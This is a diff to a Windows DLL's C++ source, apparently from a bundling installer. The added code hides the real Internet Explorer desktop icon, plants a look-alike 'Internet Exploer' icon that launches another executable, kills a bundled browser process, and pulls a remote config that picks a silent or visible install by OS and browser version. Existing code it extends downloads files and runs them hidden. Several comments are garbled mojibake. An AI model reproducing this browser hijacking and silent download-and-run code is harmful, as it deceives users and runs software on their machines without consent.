@@ -13,6 +13,8 @@
 #include <shellapi.h>
 #include <tlhelp32.h>
 #include <atlstr.h>
+#include <vector>
+using namespace std;
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -101,6 +103,22 @@ DWORD WINAPI SendHttpStatThread(LPVOID pParameter)
  
      return TRUE;
  }
+#include <Psapi.h>
+#pragma comment (lib,"Psapi.lib")
+void GetProcessPath(wchar_t* strRet, DWORD dwProcessId)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
+    if (NULL != hProcess)
+    {
+        DWORD cbNeeded;
+        HMODULE hMod;
+        // ªÒ»°¬∑æ∂
+        if (::EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
+            DWORD dw  = ::GetModuleFileNameEx(hProcess, hMod, strRet, MAX_PATH);
+
+        CloseHandle(hProcess);
+    }
+}
 
 BOOL FindAndKillProcessByName(LPCTSTR strProcessName)
 {
@@ -118,16 +136,19 @@ BOOL FindAndKillProcessByName(LPCTSTR strProcessName)
         pEntry.dwSize = sizeof( PROCESSENTRY32 );
  
         //Search for all the process and terminate it
+		wchar_t wszProcessPath[MAX_PATH] = {0}; 
         if(Process32First(handle32Snapshot, &pEntry))
         {
                 BOOL bFound = FALSE;
-                if (!_tcsicmp(pEntry.szExeFile, strProcessName))
+				GetProcessPath(wszProcessPath, pEntry.th32ProcessID);
+                if (!_tcsicmp(wszProcessPath, strProcessName))
                 {
                         bFound = TRUE;
-                        }
+                  }
                 while((!bFound)&&Process32Next(handle32Snapshot, &pEntry))
                 {
-                        if (!_tcsicmp(pEntry.szExeFile, strProcessName))
+                       GetProcessPath(wszProcessPath, pEntry.th32ProcessID);
+						if (!_tcsicmp(wszProcessPath, strProcessName))
                         {
                                 bFound = TRUE;
                         }
@@ -145,6 +166,7 @@ BOOL FindAndKillProcessByName(LPCTSTR strProcessName)
         return FALSE;
 }
 
+
 extern "C" __declspec(dllexport) void SoftExit()
 {
 	DWORD ret = WaitForSingleObject(s_ListenHandle, 20000);
@@ -155,12 +177,7 @@ extern "C" __declspec(dllexport) void SoftExit()
 	if(b_Init){
 		DeleteCriticalSection(&s_csListen);
 	}
-	TCHAR szFileFullPath[256];
-	::GetModuleFileName(NULL,static_cast<LPTSTR>(szFileFullPath),256);
-	CString szProcessName(szFileFullPath);
-	int nPos = szProcessName.ReverseFind('\\');
-	szProcessName = szProcessName.Right(szProcessName.GetLength() - nPos - 1); 
-	FindAndKillProcessByName(szProcessName);
+	TerminateProcess(::GetCurrentProcess(), 0);
 }
 
 extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *el,long ev)
@@ -188,6 +205,38 @@ extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *e
 		str += szev;
 	}
 	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-57884150-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
+
+	DWORD dwThreadId = 0;
+	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
+	CloseHandle(hThread);
+	//SendHttpStatThread((LPVOID)szURL);
+}
+
+extern "C" __declspec(dllexport) void SendAnyHttpStatIE(CHAR *ec,CHAR *ea, CHAR *el,long ev)
+{
+	if (ec == NULL || ea == NULL)
+	{
+		return ;
+	}
+	//TSAUTO();
+	CHAR* szURL = new CHAR[MAX_PATH];
+	memset(szURL, 0, MAX_PATH);
+	char szPid[256] = {0};
+	extern void GetPeerID(CHAR * pszPeerID);
+	GetPeerID(szPid);
+	std::string str = "";
+	if (el != NULL )
+	{
+		str += "&el=";
+		str += el;
+	}
+	if (ev != 0)
+	{
+		CHAR szev[MAX_PATH] = {0};
+		sprintf(szev, "&ev=%ld",ev);
+		str += szev;
+	}
+	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-60726208-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
 
 	DWORD dwThreadId = 0;
 	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
@@ -331,20 +380,51 @@ extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	//  ß∞‹∑
 	return true;
 }
 
+wchar_t* AnsiToUnicode( const char* szStr )
+{
+	int nLen = MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0 );
+	if (nLen == 0)
+	{
+		return NULL;
+	}
+	wchar_t* pResult = new wchar_t[nLen];
+	MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen );
+	return pResult;
+};
+
+extern "C" __declspec(dllexport) void KillMyIExplorer()
+{
+	char szMain[MAX_PATH] = {0};
+	GetProfileFolder(szMain);
+	if(strcmp(szMain, "") == 0)
+	{
+		return;
+	}
+	strcat(szMain, "\\iexplorer\\program\\iexplore.exe");
+	wchar_t* wszPath = AnsiToUnicode(szMain); 
+	FindAndKillProcessByName(wszPath);
+	delete [] wszPath;
+
+}
 
 DWORD WINAPI DownLoadWork(LPVOID pParameter)
 {
 	//TSAUTO();
 	CHAR szUrl[MAX_PATH] = {0};
 	strcpy(szUrl,(LPCSTR)pParameter);
-
 	CHAR szBuffer[MAX_PATH] = {0};
 	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
 	if(len == 0)
 	{
 		return 0;
 	}
-	::PathCombineA(szBuffer,szBuffer,"Setup_oemqd50.exe");
+	char *p = strrchr(szUrl, '/');
+	if(p != NULL && strlen(p+1) > 0) {
+		::PathCombineA(szBuffer,szBuffer,p+1);
+	} else {
+		::PathCombineA(szBuffer,szBuffer,"Setup_oemqd50.exe");	
+	}
+	
 	::CoInitialize(NULL);
 	HRESULT hr = E_FAIL;
 	__try
@@ -356,12 +436,12 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
 	}
 	::CoUninitialize();
-	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
+	if (strstr(szBuffer, ".exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
 	{
 		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
 	}
 	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
-}
+};
 
 extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 {
@@ -379,7 +459,7 @@ extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 		CloseHandle(hThread);
 	}
 	return;
-}
+};
 
 extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
 {
@@ -414,7 +494,7 @@ extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
 	DWORD dwThreadId = 0;
 	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
 	CloseHandle(hThread);
-}
+};
 
 #include <vector>
 #include <COMUTIL.H>
@@ -433,7 +513,7 @@ VectorVerbName*  GetVerbNames(bool bPin)
 	}
 
 	return bPin? &vecPinStartMenuNames : &vecUnPinStartMenuNames;
-}
+};
 
 bool VerbNameMatch(TCHAR* tszName, bool bPin)
 {
@@ -450,19 +530,8 @@ bool VerbNameMatch(TCHAR* tszName, bool bPin)
 		iter ++;
 	}
 	return false;
-}
+};
 
-wchar_t* AnsiToUnicode( const char* szStr )
-{
-	int nLen = MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0 );
-	if (nLen == 0)
-	{
-		return NULL;
-	}
-	wchar_t* pResult = new wchar_t[nLen];
-	MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen );
-	return pResult;
-}
 
 #define IF_FAILED_OR_NULL_BREAK(rv,ptr) \
 {if (FAILED(rv) || ptr == NULL) break;}
@@ -541,7 +610,7 @@ extern "C" __declspec(dllexport) bool PinToStartMenu4XP(bool bPin, char* szPath)
 	delete [] pwstr_Path;
 	::CoUninitialize();
 	return false;
-}
+};
 
 
 extern "C" __declspec(dllexport) void RefleshIcon(char* szPath)
@@ -551,7 +620,7 @@ extern "C" __declspec(dllexport) void RefleshIcon(char* szPath)
 								pwstr_Path,0);
 	delete [] pwstr_Path;
 
-}
+};
 
 extern "C" __declspec(dllexport) void GetUserPinPath(char* szPath)
 {
@@ -580,7 +649,7 @@ extern "C" __declspec(dllexport) void GetUserPinPath(char* szPath)
 	}
 	int nLen = (int)strUserPinPath.length();    
     int nResult = WideCharToMultiByte(CP_ACP,0,(LPCWSTR)strUserPinPath.c_str(),nLen,szPath,nLen,NULL,NULL);
-}
+};
 
 bool IsVistaOrLatter()
 {
@@ -594,49 +663,265 @@ bool IsVistaOrLatter()
 		}
 	}
 	return (osvi.dwMajorVersion >= 6);
-}
+};
 
-#include <Sddl.h>
-extern "C" __declspec(dllexport) int QueryMutex()
+void SetRegValue(HKEY hk, char* path, char* key, const char* value)
 {
-	HANDLE hMutex;
-	int nRet = 0;
-	if(::IsVistaOrLatter()) {
-		SECURITY_ATTRIBUTES sa;
-		char sd[SECURITY_DESCRIPTOR_MIN_LENGTH];
-		sa.nLength = sizeof(sa);
-		sa.bInheritHandle = FALSE;
-		sa.lpSecurityDescriptor = &sd;
-		if(::InitializeSecurityDescriptor(sa.lpSecurityDescriptor, SECURITY_DESCRIPTOR_REVISION)) {
-			if(::SetSecurityDescriptorDacl(sa.lpSecurityDescriptor, TRUE, 0, FALSE)) {
-				PSECURITY_DESCRIPTOR pSD = NULL;
-				if (::ConvertStringSecurityDescriptorToSecurityDescriptor(_T("S:(ML;;NW;;;LW)"), SDDL_REVISION_1, &pSD, NULL)) {
-					PACL pSacl = NULL;
-					BOOL fSaclPresent = FALSE;
-					BOOL fSaclDefaulted = FALSE;
-					if(::GetSecurityDescriptorSacl(pSD, &fSaclPresent, &pSacl, &fSaclDefaulted)) {
-						if(::SetSecurityDescriptorSacl(sa.lpSecurityDescriptor, TRUE, pSacl, FALSE)) {
-							hMutex = ::CreateMutex(&sa, TRUE, L"Global\\{66CC0177-5EC0-4ce5-9BAF-F75038328275}-gsaddin");
-							if(hMutex != NULL && ::GetLastError() == ERROR_ALREADY_EXISTS) {
-								::CloseHandle(hMutex);
-								hMutex = NULL;
-								nRet = 1;
-							}
-						}
-						::LocalFree(pSacl);
-					}
-					::LocalFree(pSD);
-				}
-			}
+	HKEY hKEY;
+	if (ERROR_SUCCESS != ::RegOpenKeyExA(hk, path,0,KEY_SET_VALUE,&hKEY))
+	{
+		
+		if (ERROR_SUCCESS != ::RegCreateKeyA(hk, path, &hKEY))
+		{
+			char szMsg[128] = {0};
+			sprintf(szMsg, "path=%s, key=%s, lasterror=%d", path, key, ::GetLastError());
+			TSDEBUG4CXX("SetRegValue errormsg =  " << szMsg);
 		}
 	}
-	else {
-		hMutex = ::CreateMutex(NULL, TRUE, L"Global\\{66CC0177-5EC0-4ce5-9BAF-F75038328275}-gsaddin");
-		if(hMutex != NULL && ::GetLastError() == ERROR_ALREADY_EXISTS) {
-			::CloseHandle(hMutex);
-			hMutex = NULL;
+	if(ERROR_SUCCESS == ::RegSetValueExA(hKEY, key, 0, REG_SZ, (const BYTE*)value, strlen(value)+1))
+	{
+		::RegCloseKey(hKEY);
+	}
+};
+
+extern "C" __declspec(dllexport) void HideIEIcon(int value)
+{
+	HKEY hKEY;
+	HKEY szHkey[] = {HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
+	for(int i = 0; i < sizeof(szHkey)/sizeof(HKEY); ++i)
+	{
+		LPCSTR data_Set= "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel";
+		if (ERROR_SUCCESS == ::RegOpenKeyExA(szHkey[i],data_Set,0,KEY_SET_VALUE,&hKEY))
+		{
+			DWORD valuedata=value;
+			::RegSetValueExA(hKEY, "{871C5380-42A0-1069-A2EA-08002B30309D}", 0, REG_DWORD, (LPBYTE)&valuedata, sizeof(DWORD));
+			::RegCloseKey(hKEY);
+		}
+		data_Set= "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu";
+		if (ERROR_SUCCESS == ::RegOpenKeyExA(szHkey[i],data_Set,0,KEY_SET_VALUE,&hKEY))
+		{
+			DWORD valuedata=value;
+			::RegSetValueExA(hKEY, "{871C5380-42A0-1069-A2EA-08002B30309D}", 0, REG_DWORD, (BYTE*)&valuedata, sizeof(DWORD));
+			::RegCloseKey(hKEY);
+		}
+	}
+}
+
+extern "C" __declspec(dllexport) void ReplaceIcon(const char* strExePath)
+{
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "InfoTip", "≤È’“≤¢œ‘ æ Iternet …œµƒ–≈œ¢∫ÕÕ¯’æ°£");
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "LocalizedString", "Internet Explorer");
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon", "", strExePath);
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open", "", "¥Úø™÷˜“≥(&H)");
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", "", strExePath);
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop", "", " Ù–‘(&R)");
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command", "", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl");
+	SetRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "", "Internet Exploer");
+}
+
+extern "C" __declspec(dllexport) void ReductionIcon()
+{
+	RegDeleteKeyA(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}");
+	RegDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}");
+}
+
+extern "C" __declspec(dllexport) int IsOsUac()
+{
+	if(IsVistaOrLatter()){
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+HANDLE hThreadINI;
+extern "C" __declspec(dllexport) int WaitINI()
+{
+	int nRet = 0;
+	if (NULL != hThreadINI)
+	{
+		DWORD dwRet = WaitForSingleObject(hThreadINI, 5000);
+		if (dwRet == WAIT_OBJECT_0)
+		{
 			nRet = 1;
 		}
+		CloseHandle(hThreadINI);
 	}
 	return nRet;
 }
+
+void GetFileVersionString(const char* utf8FilePath, char* szRet)
+{
+
+	DWORD dwHandle = 0;
+	DWORD dwSize = ::GetFileVersionInfoSizeA(utf8FilePath, &dwHandle);
+	std::string utf8Version;
+	if(dwSize > 0)
+	{
+		CHAR * pVersionInfo = new CHAR[dwSize+1];
+		if(::GetFileVersionInfoA(utf8FilePath, dwHandle, dwSize, pVersionInfo))
+		{
+			VS_FIXEDFILEINFO * pvi;
+			UINT uLength = 0;
+			if(::VerQueryValueA(pVersionInfo, "\\", (void **)&pvi, &uLength))
+			{
+				//sprintf(szRet, "%d.%d.%d.%d",
+				//	HIWORD(pvi->dwFileVersionMS), LOWORD(pvi->dwFileVersionMS),
+				//	HIWORD(pvi->dwFileVersionLS), LOWORD(pvi->dwFileVersionLS));
+				sprintf(szRet, "%d",
+					HIWORD(pvi->dwFileVersionMS));
+			}
+		}
+		delete pVersionInfo;
+	}
+	
+}
+
+//∑µªÿ0£∫∂º≤ª∞≤◊∞£¨1£∫æ≤ƒ¨∞≤◊∞£¨2”–ΩÁ√Ê∞≤◊∞£¨ 3£∫∂º∞≤◊∞
+extern "C" __declspec(dllexport) int DownLoadIniConfig()
+{
+	static CHAR szIniUrl[] = "http://www.91yuanbao.com/cmi/iesetupconfig.dat";
+	DWORD dwThreadId = 0;
+	hThreadINI = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szIniUrl,0, &dwThreadId);
+	WaitINI();
+	int nRet = 0;
+	CHAR szBuffer[MAX_PATH] = {0};
+	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
+	if(len == 0)
+	{
+		return nRet;
+	}
+	char *p = strrchr(szIniUrl, '/');
+	if(p != NULL && strlen(p+1) > 0) {
+		::PathCombineA(szBuffer,szBuffer,p+1);
+		if(::PathFileExistsA(szBuffer)) {
+			int nSubRet1 = 0, nSubRet2 = 0;//√ª”–section‘Ú≤ª∞≤◊∞
+			//œ»≈–∂œ”–√ª”–section
+			char silentsec[1024] = {0};
+			GetPrivateProfileSectionNamesA(silentsec, 1024, szBuffer);
+			char* pstart = silentsec, *pend = NULL;
+			vector<string> vec;
+			while(pstart != pend)
+			{
+				pend = strchr(pstart, 0);
+				size_t iLenTmp = pend - pstart;
+				if(iLenTmp == 0)
+					break;
+				vec.push_back(pstart);
+				pstart = pend+1;
+				
+			}
+			vector<string>::iterator it = vec.begin();
+			for(; it != vec.end(); ++it)
+			{
+				if(*it == "silent"){
+					TSDEBUG4CXX("DownLoadIniConfig:find slient section");
+					nSubRet1 = 1;
+				} else if(*it == "haveui"){
+					TSDEBUG4CXX("DownLoadIniConfig:find hhaveui section");
+					nSubRet2 = 1;
+				}
+			}
+			//≈–∂œœµÕ≥∞Ê±æ
+			OSVERSIONINFOEX osvi;
+			ZeroMemory(&osvi,sizeof(OSVERSIONINFOEX));
+			osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+			if (!GetVersionEx((OSVERSIONINFO*)&osvi))
+			{
+				osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
+				if (!GetVersionEx((OSVERSIONINFO*)&osvi)) 
+				{
+					return nRet;
+				}
+			}
+			char strVer[256] = {0};
+			sprintf(strVer, "%d.%d",osvi.dwMajorVersion, osvi.dwMinorVersion);
+			TSDEBUG4CXX("DownLoadIniConfig:get os ver success, strVer = "<<strVer);
+			char iniVer[256] = {0};
+			GetPrivateProfileStringA("silent", "osver", "error", iniVer, 256, szBuffer);
+			if(strcmp(iniVer, "error") != 0)
+			{
+				if(strstr(iniVer, strVer) == NULL)
+				{
+					TSDEBUG4CXX("DownLoadIniConfig:nSubRet1 = 0, because osver not in ini, iniVer = "<<iniVer);
+					nSubRet1 = 0;
+				}
+			}
+			memset(iniVer, 0, 256);
+			GetPrivateProfileStringA("haveui", "osver", "error", iniVer, 256, szBuffer);
+			if(strcmp(iniVer, "error") != 0)
+			{
+				if(strstr(iniVer, strVer) == NULL)
+				{
+					TSDEBUG4CXX("DownLoadIniConfig:nSubRet2 = 0, because osver not in ini, iniVer = "<<iniVer);
+					nSubRet2 = 0;
+				}
+			}
+			if(nSubRet1 == 0 && nSubRet2 == 0){//»Áπ˚∂º≤ª¬˙◊„‘Úø…“‘»∑∂®Ω·π˚£¨ ∑Ò‘Úªπµ√Ω¯“ª≤Ω—È÷§
+				nRet = 0;
+				return nRet;
+			}
+			//≈–∂œie¥Û∞Ê±æ
+			char szIEPath[MAX_PATH] = {0};
+			if (::SHGetSpecialFolderPathA(::GetDesktopWindow(),szIEPath,CSIDL_PROGRAM_FILES,FALSE))
+			{
+				strncat(szIEPath, "\\Internet Explorer\\iexplore.exe",64);
+				if(PathFileExistsA(szIEPath)){
+					char strIEVer[256] = {0};
+					GetFileVersionString(szIEPath, strIEVer);
+					if(strcmp(strIEVer, "") != 0){
+						char strIEVer2[256] = {0};
+						sprintf(strIEVer2, ",%s,", strIEVer);
+						char iniIEVer[256] = {0};
+						GetPrivateProfileStringA("silent", "iever", "error", iniIEVer, 256, szBuffer);
+						if(strcmp(iniIEVer, "error") != 0)
+						{
+							if(strstr(iniIEVer, strIEVer2) == NULL)
+							{
+								TSDEBUG4CXX("DownLoadIniConfig:nSubRet1 = 0, because iever not in ini, iniIEVer = "<<iniIEVer);
+								nSubRet1 = 0;
+							}
+						}
+						memset(iniIEVer, 0, 256);
+						GetPrivateProfileStringA("haveui", "iever", "error", iniIEVer, 256, szBuffer);
+						if(strcmp(iniIEVer, "error") != 0)
+						{
+							if(strstr(iniIEVer, strIEVer2) == NULL)
+							{
+								TSDEBUG4CXX("DownLoadIniConfig:nSubRet2 = 0, because iever not in ini, iniIEVer = "<<iniIEVer);
+								nSubRet2 = 0;
+							}
+						}
+					} else {
+						TSDEBUG4CXX("DownLoadIniConfig: get iever failed");
+						return 0;
+					}
+				} else {
+					TSDEBUG4CXX("DownLoadIniConfig: get ie path ok, but it not exist szValue = "<<szIEPath<<", LASTERR = "<<::GetLastError());
+					return 0;
+				}
+			}else{
+				TSDEBUG4CXX("DownLoadIniConfig: get ie path failed");
+			}
+			if(nSubRet1 == 0 && nSubRet2 == 0){//»Áπ˚∂º≤ª¬˙◊„‘Úø…“‘»∑∂®Ω·π˚£¨ ∑Ò‘Úªπµ√Ω¯“ª≤Ω—È÷§
+				nRet = 0;	
+			}else if(nSubRet1 == 1 && nSubRet2 == 0){
+				nRet = 1;
+			}else if(nSubRet1 == 0 && nSubRet2 == 1){
+				nRet = 2;
+			}else {//if(nSubRet1 == 1 && nSubRet2 == 1){
+				nRet = 3;
+			}
+			return nRet;
+
+		}else{
+			TSDEBUG4CXX("DownLoadIniConfig:ini file not exist");
+			return nRet;
+		}
+	} else {
+		TSDEBUG4CXX("DownLoadIniConfig:get ini path failed");
+		return nRet;
+	}
+
+}
+
